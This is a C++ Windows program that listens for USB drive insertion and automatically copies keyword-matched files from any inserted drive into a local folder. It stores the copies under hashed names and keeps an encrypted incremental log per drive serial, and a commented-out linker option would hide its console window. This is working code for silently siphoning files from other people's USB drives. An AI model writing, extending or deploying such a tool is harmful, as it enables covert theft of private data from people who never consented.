#include <windows.h>
#include <iostream>
#include <dbt.h>
#include <vector>
#include <filesystem>
#include <unordered_map>
#include <unordered_set>

#include <chrono>

#include "cupfunc.h"
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

namespace fs = std::filesystem;
// 在文件开头添加以下常量定义
const int SLEEP_DELAY = 2000;  // USB设备插入后的延迟时间
const std::string DATA_DIR = "data/";
const std::string LOG_DIR = "log/";

// 合并文件信息相关的结构体
struct FileInfo {
    std::string path, parent_path, filename, hashedPath, hashedFilename;  
    uintmax_t size;
    int64_t modifiedTime;
};

// 简化日志结构
struct DirectoryLogInfo {
    std::string original_path;
    std::unordered_map<std::string, FileInfo> files;  // key: hashedFilename
};

// 配置结构体
struct Config {
    uintmax_t maxFileSize = 0;
    std::vector<std::string> keywords;
    std::vector<std::string> allowedExtensions;  // 新增：允许的文件扩展名列表
} config;

// 全局变量
std::vector<FileInfo> fileList;
DWORD serialNumber = 0;
std::unordered_map<std::string, DirectoryLogInfo> existingFiles;  // 移到全局，避免频繁传递

// 加载配置文件
bool LoadConfig(const std::string& path) {
    Json::Value data;
    readFileData_dec(path, data);

    config.maxFileSize = data["MaxFileSize"].asUInt64();
    config.maxFileSize = 1048576000;
    for (const auto& k : data["Keywords"]) {
        config.keywords.push_back(k.asString());
    }
    // 新增：读取允许的文件扩展名
    for (const auto& ext : data["AllowedExtensions"]) {
        config.allowedExtensions.push_back(ext.asString());
    }
    // 对扩展名列表进行排序，以便后续使用 binary_search
    std::sort(config.allowedExtensions.begin(), config.allowedExtensions.end());
    
    return true;
}

// 简化 readExistingLog 函数，只保留必要的信息
std::unordered_map<std::string, DirectoryLogInfo> readExistingLog(DWORD serial) {
    std::unordered_map<std::string, DirectoryLogInfo> existingFiles;
    fs::path logFile = fs::path(LOG_DIR) / (std::to_string(serial) + ".json");
    
    if (!fs::exists(logFile)) return existingFiles;
    
    try {
        Json::Value root;
        readFileData_dec(logFile.string(), root);
        
        for (const auto& dirName : root.getMemberNames()) {
            const Json::Value& dirNode = root[dirName];
            DirectoryLogInfo& dirInfo = existingFiles[dirName];
            
            for (const auto& fileName : dirNode["files"].getMemberNames()) {
                const Json::Value& fileNode = dirNode["files"][fileName];
                FileInfo& info = dirInfo.files[fileName];

                info.hashedPath = dirName;
                info.hashedFilename = fileName;
                info.modifiedTime = fileNode["modified_time"].asInt64();
            }
        }

    }
    catch (const std::exception& e) {
        std::cerr << "读取日志文件失败: " << e.what() << std::endl;
    }
    
    return existingFiles;
}

// 简化文件过滤函数
bool ShouldIncludeFile(FileInfo& file) {
    // 快速检查关键词
    bool hasKeyword = config.keywords.empty();  // 如果没有关键词，则默认为true
    for (const auto& keyword : config.keywords) {
        if (file.path.find(keyword) != std::string::npos) {
            hasKeyword = true;
            break;
        }
    }
    if (!hasKeyword) return false;

    // 计算哈希值并检查文件是否需要更新
    std::hash<std::string> hasher;
    file.hashedPath = std::to_string(hasher(file.parent_path));
    file.hashedFilename = std::to_string(hasher(file.filename));

    auto dirIt = existingFiles.find(file.hashedPath);
    if (dirIt != existingFiles.end()) {
        auto& fileMap = dirIt->second.files;
        auto fileIt = fileMap.find(file.hashedFilename);
        if (fileIt != fileMap.end() && fileIt->second.modifiedTime >= file.modifiedTime) {
            return false;
        }
    }

    return true;
}

// 修改GetAllFiles函数，只收集文件信息
void GetAllFiles(const fs::path& dir) {
    static const auto timeDiff = std::chrono::system_clock::now().time_since_epoch() - 
                                fs::file_time_type::clock::now().time_since_epoch();
    
    //fileList.reserve(1000);
        // 使用 directory_iterator 而不是 recursive_directory_iterator
        // 因为手动递归在大多数情况下性能更好
    for (const auto& entry : fs::directory_iterator(dir,fs::directory_options::skip_permission_denied)) {
        try {
            if (entry.is_directory()) {
                GetAllFiles(entry.path());
            }
            else{
                if (entry.file_size() <= config.maxFileSize) {
                    if (std::find(config.allowedExtensions.begin(), config.allowedExtensions.end(), entry.path().extension()) != config.allowedExtensions.end()) {
                    
                        FileInfo info{
                             entry.path().string(),
                             entry.path().parent_path().string(),
                             entry.path().filename().string(),
                             "",
                             "",
                             fs::file_size(entry.path()),
                             (fs::last_write_time(entry.path()).time_since_epoch().count() + timeDiff.count()) / 10000000
                        };
                        if (ShouldIncludeFile(info)) {
                            fileList.push_back(std::move(info));
                        }
                    }

                }
            }
        }
        catch (const std::exception& e) {
            std::cerr << "处理文件失败: " << entry.path() << " 错误: " << e.what() << std::endl;
            continue;
        }
    }             
}

// 修改 copyAllFiles 函数，添加返回值来跟踪成功复制的文件
std::vector<FileInfo> copyAllFiles() {
    std::vector<FileInfo> successfulCopies;
    successfulCopies.reserve(fileList.size());
    
    const size_t total = fileList.size();
    size_t current = 0;
    const std::string serialDir = DATA_DIR + std::to_string(serialNumber);
    
    // 创建基础目录
    std::error_code ec;
    fs::create_directories(serialDir, ec);
    if (ec) {
        std::cerr << "创建目录失败: " << serialDir << " 错误: " << ec.message() << std::endl;
        return successfulCopies;
    }

    std::unordered_set<std::string> createdDirs;
    
    for (const auto& file : fileList) {
        const fs::path destPath = fs::path(serialDir) / file.hashedPath;
        
        if (!createdDirs.count(file.hashedPath)) {
            fs::create_directories(destPath, ec);
            if (ec) {
                std::cerr << "创建目录失败: " << destPath << " 错误: " << ec.message() << std::endl;
                continue;
            }
            createdDirs.insert(file.hashedPath);
        }
        
        const fs::path destFile = destPath / file.hashedFilename;
        try {
            fs::copy_file(file.path, destFile, fs::copy_options::overwrite_existing);
            successfulCopies.push_back(file);  // 只记录成功复制的文件
            std::cout << "\r复制进度: " << ++current << "/" << total 
                     << " (" << (current * 100 / total) << "%)" << std::flush;
        }
        catch (const std::exception& e) {
            std::cerr << "\n复制文件失败: " << file.path << " 错误: " << e.what() << std::endl;
        }
    }
    std::cout << std::endl;
    return successfulCopies;
}

// 修改 writeLogFile 函数的参数，接收成功复制的文件列表
void writeLogFile(const std::vector<FileInfo>& successfulFiles) {

    fs::path logPath = fs::path(LOG_DIR);
    fs::create_directories(logPath);
    std::string logFilePath = (logPath / (std::to_string(serialNumber) + ".json")).string();
    
    Json::Value root;
    if (fs::exists(logFilePath)) {
        readFileData_dec(logFilePath, root);
    }
    
    for (const auto& fileInfo : successfulFiles) {
        Json::Value& parent = root[fileInfo.hashedPath];
        // 设置或更新 original_path
        parent["original_path"] = fileInfo.parent_path;
        // 更新或添加文件信息
        Json::Value& fileNode = parent["files"][fileInfo.hashedFilename];
        fileNode["original_filename"] = fileInfo.filename;
        fileNode["size"] = Json::UInt64(fileInfo.size);
        fileNode["modified_time"] = Json::Int64(fileInfo.modifiedTime);
        
    }    
    writeFileData_enc(logFilePath, root);
}

// 修改OnUSBInsert函数
void OnUSBInsert(WPARAM wParam, LPARAM lParam) {
    try {
        if(wParam != DBT_DEVICEARRIVAL) return;

        auto pHdr = (PDEV_BROADCAST_HDR)lParam;
        if(pHdr->dbch_devicetype != DBT_DEVTYP_VOLUME) return;
        
        auto pVol = (PDEV_BROADCAST_VOLUME)pHdr;
        char drive = 'A';
        while(!(pVol->dbcv_unitmask & 1)) {
            pVol->dbcv_unitmask >>= 1;
            drive++;
        }
        
        const std::string path = std::string(1, drive) + ":\\";
        //Sleep(SLEEP_DELAY);
        
        if(!fs::exists(path)) return;
        
        fileList.clear();
        
        if (!GetVolumeInformationA(path.c_str(), NULL, 0, &serialNumber, NULL, NULL, NULL, 0)) {
            std::cerr << "获取符序列号失败" << std::endl;
            return;
        }
        
        std::cout << "检测到新U盘插入，盘符: " << path << " 序列号: " << serialNumber << std::endl;
        
        existingFiles = readExistingLog(serialNumber);
        //auto start = std::chrono::high_resolution_clock::now();
        GetAllFiles(path);
        
        if (!fileList.empty()) {
            auto successfulFiles = copyAllFiles();
            if (!successfulFiles.empty()) {
                writeLogFile(successfulFiles);
                std::cout << "成功复制 " << successfulFiles.size() << " 个文件" << std::endl;
            }
            std::cout << "文件处理完成" << std::endl;
        } else {
            std::cout << "没有需要复制的新文件" << std::endl;
        }
        //auto end = std::chrono::high_resolution_clock::now();
        //auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
        //std::cout << "执行时间: " << duration.count() << " 毫秒" << std::endl;

    }
    catch (const std::exception& e) {
        std::cerr << "处理U盘插入时发生异常: " << e.what() << std::endl;
    }
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
    if(msg == WM_DEVICECHANGE) OnUSBInsert(wp, lp);
    return DefWindowProc(hwnd, msg, wp, lp);
}

int main() {
    if(!LoadConfig("config.json")) return 1;

    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WindowProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, L"USBDetectWindow", NULL };
    RegisterClassEx(&wc);
    HWND hwnd = CreateWindowEx(0, L"USBDetectWindow", L"USB Detector", 0, 0, 0, 0, 0, 
                              nullptr, nullptr, wc.hInstance, nullptr);                         
    DEV_BROADCAST_DEVICEINTERFACE_A notificationFilter = { sizeof(DEV_BROADCAST_DEVICEINTERFACE_A), DBT_DEVTYP_VOLUME };
    HDEVNOTIFY deviceNotify = RegisterDeviceNotificationA(hwnd, &notificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE | DEVICE_NOTIFY_ALL_INTERFACE_CLASSES);

    MSG msg;
    std::cout << "正在监听U盘插入...\n按Ctrl+C退出程序" << std::endl;
    while(GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (deviceNotify) UnregisterDeviceNotification(deviceNotify);

    return 0;
}
